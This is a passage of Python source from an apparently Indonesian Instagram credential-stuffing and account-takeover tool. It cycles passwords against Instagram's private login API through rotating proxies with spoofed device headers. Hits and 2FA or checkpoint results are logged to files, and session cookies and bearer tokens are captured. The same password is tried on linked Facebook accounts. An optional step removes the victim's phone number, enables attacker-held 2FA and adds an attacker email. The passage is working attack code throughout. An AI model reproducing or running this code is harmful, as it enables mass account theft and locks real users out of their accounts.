                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                            tree.add(f'[italic white]Username [green]{username}')
                            tree.add(f'[italic white]Fullname [green]{fullname}')
                            tree.add(f'[italic white]Password [green]{passwd}')
                            tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                            trup = tree.add('[italic green]Response Facebook')
                            trup.add(f'[italic white]Username [green]{users}')
                            trup.add(f'[italic white]Fullname [green]{fulls}')
                            trup.add(f'[italic white]Password [green]{passwd}')
                            trup.add(f'[italic white]Response [green]{response_facebook}')
                            trua = tree.add('[italic green]Response Cookie')
                            trua.add(f'[italic white]Cookie [green]{cookie}')
                            tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                    else:
                        tree = Tree('\r                                             ')
                        tree = tree.add('╭ [italic green]Response Success')
                        tree.add(f'[italic white]Username [green]{username}')
                        tree.add(f'[italic white]Fullname [green]{fullname}')
                        tree.add(f'[italic white]Password [green]{passwd}')
                        tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                        trup = tree.add('[italic green]Response Facebook')
                        trup.add(f'[italic white]Username [green]{users}')
                        trup.add(f'[italic white]Fullname [green]{fulls}')
                        trup.add(f'[italic white]Password [green]{passwd}')
                        trup.add(f'[italic white]Response [green]{response_facebook}')
                        trua = tree.add('[italic green]Response Cookie')
                        trua.add(f'[italic white]Cookie [green]{cookie}')
                        tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break          
                elif 'two_factor_required' in str(response.replace('\\','')):
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [italic red]Response A2F')
                    tree.add(f'[italic white]Username : [red]{username}')
                    tree.add(f'[italic white]Fullname : [red]{fullname}')
                    tree.add(f'[italic white]Password : [red]{passwd}')
                    tree.add(f'[italic white]Profiles : [red]{follower}[grey50]/[red]{followed}[grey50]/[red]{feedpost}')
                    tree.add(f'[italic white]Useragent : [red]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'challenge_required' in str(response.replace('\\','')):
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [italic yellow]Response Checkpoint')
                    tree.add(f'[italic white]Username : [yellow]{username}')
                    tree.add(f'[italic white]Fullname : [yellow]{fullname}')
                    tree.add(f'[italic white]Password : [yellow]{passwd}')
                    tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response.replace('\\','')):
                    Console().print(f"[grey50]   ──>[red] Hidupkan Mode Pesawat 5 Detik!!", end='\r')
                    time.sleep(3.5)  
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)              
        self.looping+=1
        
    def Exec_Private_Api_V2(self, username, password):
        byps = requests.Session()
        Console().print(f"[grey50]   ──> ([green](Cracking)[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
        for passwd in password:
            try:
                byps.headers.update({**Requ().HeadersApiLogin(),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s'%(Requ().Android_ID(username,passwd).hexdigest()[:16]),
                    'x-ig-timezone-offset': str(Requ().timezone_offset()),
                    'x-ig-app-id': '567067343352427',
                    'user-agent': Useragent().useragent_instagram(Requ().HeadersApiLogin()['x-bloks-version-id'])
                })
                encode = ('params={"client_input_params":{"device_id":"'+byps.headers['x-ig-android-id']+'","login_attempt_count":1,"secure_family_device_id":"","machine_id":"'+str(byps.headers['x-mid'])+'","accounts_list":[],"auth_secure_device_id":"","has_whatsapp_installed":0,"password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+passwd+'","sso_token_map_json_string":"","family_device_id":"'+str(uuid.uuid4())+'","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":"","lara_override":""},"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"client_known_key_hash":"","contact_point":"'+username+'","encrypted_msisdn":""},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"username_text_input_id":"18g3p8:57","layered_homepage_experiment_group":null,"should_trigger_override_login_success_action":0,"device_id":null,"login_credential_type":"none","server_login_source":"login","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":7465439600681,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"is_platform_login":0,"credential_type":"password","caller":"gslr","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","password_text_input_id":"18g3p8:58","is_from_logged_in_switcher":0,"ar_event_source":"login_home_page"}}&bk_client_context={"bloks_version":"'+str(byps.headers['x-bloks-version-id'])+'","styles_id":"instagram"}&bloks_versioning_id='+str(byps.headers['x-bloks-version-id']))
                byps.headers.update({
                    'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                })
                try:
                    proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
                except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                response = byps.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                self.save_result = self.Simpan_Result()
                if 'logged_in_user' in str(response.replace('\\','')):
                    self.success+=1
                    try: ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1); decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_autorization.split('Bearer IGT:2:')[1]))
                    except (Exception) as e: print(e)
                    try:
                        cookie = (';'.join(['%s=%s'%(name, value) for name, value in decode_ig_set_authorization.items()]))
                    except (Exception) as e: cookie = ('Cookies tidak di temukan')
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    try: facebook_acc = Requ().Facebook_Acc(cookie)
                    except (UnboundLocalError) as e: pass
                    try:
                        users = facebook_acc.split('|')[0]
                        fulls = facebook_acc.split('|')[1]
                        response_facebook = AccesFacebook().Username_And_Password(users,passwd)
                    except (Exception, UnboundLocalError) as e: response_facebook = ('Response Error 404')
                    if 'ya' in self.amankan_akun:
                        try:
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} berhasil di hapus' if statp is True else f'{pone} gagal di hapus '
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'A2F berhasil di aktifkan' if statf is not False else 'A2F gagal di aktifkan'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'berhasil di konfirmasi' if state is True else 'gagal di konfirmasi'
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                            tree.add(f'[italic white]Username [green]{username}')
                            tree.add(f'[italic white]Fullname [green]{fullname}')
                            tree.add(f'[italic white]Password [green]{passwd}')
                            tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                            trup = tree.add('[italic green]Response Facebook')
                            trup.add(f'[italic white]Username [green]{users}')
                            trup.add(f'[italic white]Fullname [green]{fulls}')
                            trup.add(f'[italic white]Password [green]{passwd}')
                            trup.add(f'[italic white]Response [green]{response_facebook}')
                            truu= tree.add('[italic green]Response 2FA')
                            truu.add(f'[italic white]Response [green]{email} {statd}')
                            truu.add(f'[italic white]Response [green]{inbx}')
                            truu.add(f'[italic white]Response [green]{deleted}')
                            truu.add(f'[italic white]Response [green]{stat2fa}')
                            truu.add(f'[italic white]Response [green]{key}')
                            truu.add(f'[italic white]Response [green]{kode}')
                            trua = tree.add('[italic green]Response Cookie')
                            trua.add(f'[italic white]Cookie [green]{cookie}')
                            trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                            tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                            tree.add(f'[italic white]Username [green]{username}')
                            tree.add(f'[italic white]Fullname [green]{fullname}')
                            tree.add(f'[italic white]Password [green]{passwd}')
                            tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                            trup = tree.add('[italic green]Response Facebook')
                            trup.add(f'[italic white]Username [green]{users}')
                            trup.add(f'[italic white]Fullname [green]{fulls}')
                            trup.add(f'[italic white]Password [green]{passwd}')
                            trup.add(f'[italic white]Response [green]{response_facebook}')
                            trua = tree.add('[italic green]Response Cookie')
                            trua.add(f'[italic white]Cookie [green]{cookie}')
                            trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                            tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                    else:
                        tree = Tree('\r                                             ')
                        tree = tree.add('╭ [italic green]Response Success')
                        tree.add(f'[italic white]Username [green]{username}')
                        tree.add(f'[italic white]Fullname [green]{fullname}')
                        tree.add(f'[italic white]Password [green]{passwd}')
                        tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                        trup = tree.add('[italic green]Response Facebook')
                        trup.add(f'[italic white]Username [green]{users}')
                        trup.add(f'[italic white]Fullname [green]{fulls}')
                        trup.add(f'[italic white]Password [green]{passwd}')
                        trup.add(f'[italic white]Response [green]{response_facebook}')
                        trua = tree.add('[italic green]Response Cookie')
                        trua.add(f'[italic white]Cookie [green]{cookie}')
                        trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                        tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break          
                elif 'two_factor_required' in str(response.replace('\\','')):
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [italic red]Response A2F')
                    tree.add(f'[italic white]Username : [red]{username}')
                    tree.add(f'[italic white]Fullname : [red]{fullname}')
                    tree.add(f'[italic white]Password : [red]{passwd}')
                    tree.add(f'[italic white]Profiles : [red]{follower}[grey50]/[red]{followed}[grey50]/[red]{feedpost}')
                    tree.add(f'[italic white]Useragent : [red]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'challenge_required' in str(response.replace('\\','')):
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [italic yellow]Response Checkpoint')
                    tree.add(f'[italic white]Username : [yellow]{username}')
                    tree.add(f'[italic white]Fullname : [yellow]{fullname}')
                    tree.add(f'[italic white]Password : [yellow]{passwd}')
                    tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response.replace('\\','')):
                    Console().print(f"[grey50]   ──>[red] Hidupkan Mode Pesawat 5 Detik!!", end='\r')
                    time.sleep(3.5)  
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)               
        self.looping+=1
        
    def Exec_Private_Api_Threads(self, username, password):
        byps = requests.Session()
        Console().print(f"[grey50]   ──> ([green](Cracking)[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
        for passwd in password:
            try:
                byps.headers.update({**Requ().HeadersApiLogin(),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s'%(Requ().Android_ID(username,passwd).hexdigest()[:16]),
                    'x-ig-timezone-offset': str(Requ().timezone_offset()),
                    'x-ig-app-id': '567067343352427',
                    'user-agent': Useragent().useragent_instagram(Requ().HeadersApiLogin()['x-bloks-version-id'])
                })
                paswd  = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), passwd)
                encode = (f'params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{urllib.parse.quote_plus(paswd)}%22%2C%22contact_point%22%3A%22{str(username)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{byps.headers["x-ig-family-device-id"]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{byps.headers["x-ig-android-id"]}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{byps.headers["x-ig-family-device-id"]}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{byps.headers["x-ig-android-id"]}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%22{str(byps.headers["x-bloks-version-id"])}%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id={str(byps.headers["x-bloks-version-id"])}')                
                byps.headers.update({
                    'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                })
                try:
                    proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
                except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                response = byps.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                self.save_result = self.Simpan_Result()
                if 'logged_in_user' in str(response.replace('\\','')):
                    self.success+=1
                    try: ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1); decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_autorization.split('Bearer IGT:2:')[1]))
                    except (Exception) as e: print(e)
                    try:
                        cookie = (';'.join(['%s=%s'%(name, value) for name, value in decode_ig_set_authorization.items()]))
                    except (Exception) as e: cookie = ('Cookies tidak di temukan')
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    try: facebook_acc = Requ().Facebook_Acc(cookie)
                    except (UnboundLocalError) as e: pass
                    try:
                        users = facebook_acc.split('|')[0]
                        fulls = facebook_acc.split('|')[1]
                        response_facebook = AccesFacebook().Username_And_Password(users,passwd)
                    except (Exception, UnboundLocalError) as e: response_facebook = ('Response Error 404')
                    if 'ya' in self.amankan_akun:
                        try:
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} berhasil di hapus' if statp is True else f'{pone} gagal di hapus '
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'A2F berhasil di aktifkan' if statf is not False else 'A2F gagal di aktifkan'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'berhasil di konfirmasi' if state is True else 'gagal di konfirmasi'
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                            tree.add(f'[italic white]Username [green]{username}')
                            tree.add(f'[italic white]Fullname [green]{fullname}')
                            tree.add(f'[italic white]Password [green]{passwd}')
                            tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                            trup = tree.add('[italic green]Response Facebook')
                            trup.add(f'[italic white]Username [green]{users}')
                            trup.add(f'[italic white]Fullname [green]{fulls}')
                            trup.add(f'[italic white]Password [green]{passwd}')
                            trup.add(f'[italic white]Response [green]{response_facebook}')
                            truu= tree.add('[italic green]Response 2FA')
                            truu.add(f'[italic white]Response [green]{email} {statd}')
                            truu.add(f'[italic white]Response [green]{inbx}')
                            truu.add(f'[italic white]Response [green]{deleted}')
                            truu.add(f'[italic white]Response [green]{stat2fa}')
                            truu.add(f'[italic white]Response [green]{key}')
                            truu.add(f'[italic white]Response [green]{kode}')
                            trua = tree.add('[italic green]Response Cookie')
                            trua.add(f'[italic white]Cookie [green]{cookie}')
                            trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                            tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                            tree.add(f'[italic white]Username [green]{username}')
                            tree.add(f'[italic white]Fullname [green]{fullname}')
                            tree.add(f'[italic white]Password [green]{passwd}')
                            tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                            trup = tree.add('[italic green]Response Facebook')
                            trup.add(f'[italic white]Username [green]{users}')
                            trup.add(f'[italic white]Fullname [green]{fulls}')
                            trup.add(f'[italic white]Password [green]{passwd}')
                            trup.add(f'[italic white]Response [green]{response_facebook}')
                            trua = tree.add('[italic green]Response Cookie')
                            trua.add(f'[italic white]Cookie [green]{cookie}')
                            trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                            tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                    else:
                        tree = Tree('\r                                             ')
                        tree = tree.add('╭ [italic green]Response Success')
                        tree.add(f'[italic white]Username [green]{username}')
                        tree.add(f'[italic white]Fullname [green]{fullname}')
                        tree.add(f'[italic white]Password [green]{passwd}')
                        tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                        trup = tree.add('[italic green]Response Facebook')
                        trup.add(f'[italic white]Username [green]{users}')
                        trup.add(f'[italic white]Fullname [green]{fulls}')
                        trup.add(f'[italic white]Password [green]{passwd}')
                        trup.add(f'[italic white]Response [green]{response_facebook}')
                        trua = tree.add('[italic green]Response Cookie')
                        trua.add(f'[italic white]Cookie [green]{cookie}')
                        trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                        tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break          
                elif 'two_factor_required' in str(response.replace('\\','')):
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [italic red]Response A2F')
                    tree.add(f'[italic white]Username : [red]{username}')
                    tree.add(f'[italic white]Fullname : [red]{fullname}')
                    tree.add(f'[italic white]Password : [red]{passwd}')
                    tree.add(f'[italic white]Profiles : [red]{follower}[grey50]/[red]{followed}[grey50]/[red]{feedpost}')
                    tree.add(f'[italic white]Useragent : [red]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'challenge_required' in str(response.replace('\\','')):
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [italic yellow]Response Checkpoint')
                    tree.add(f'[italic white]Username : [yellow]{username}')
                    tree.add(f'[italic white]Fullname : [yellow]{fullname}')
                    tree.add(f'[italic white]Password : [yellow]{passwd}')
                    tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response.replace('\\','')):
                    Console().print(f"[grey50]   ──>[red] Hidupkan Mode Pesawat 5 Detik!!", end='\r')
                    time.sleep(3.5)  
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)               
        self.looping+=1
        
    def Exec_Private_Api_Smartlock(self, username, password):
        byps = requests.Session()
        Console().print(f"[grey50]   ──> ([green](Cracking)[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')  
        for passwd in password:
            try:
                byps.headers.update({**Requ().HeadersApiLogin(),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s'%(Requ().Android_ID(username,passwd).hexdigest()[:16]),
                    'x-ig-timezone-offset': str(Requ().timezone_offset()),
                    'x-ig-app-id': '567067343352427',
                    'user-agent': Useragent().useragent_instagram(Requ().HeadersApiLogin()['x-bloks-version-id'])
                })
                payload = {
                    'params': '{"client_input_params":{"device_id":"'+ str(byps.headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(username)+'","machine_id":"'+str(byps.headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(username)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(passwd)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(byps.headers['x-ig-family-device-id'])+'","device_id":"'+str(byps.headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}', 'bk_client_context': '{"bloks_version":"'+ str(byps.headers['x-bloks-version-id']) +'","styles_id":"instagram"}','bloks_versioning_id': str(byps.headers['x-bloks-version-id'])
                }
                encode = ('params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(payload['params']), urllib.parse.quote(payload['bk_client_context']), payload['bloks_versioning_id'])+'&ig_sig_key_version=4')
                byps.headers.update({
                    'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                })              
                try:
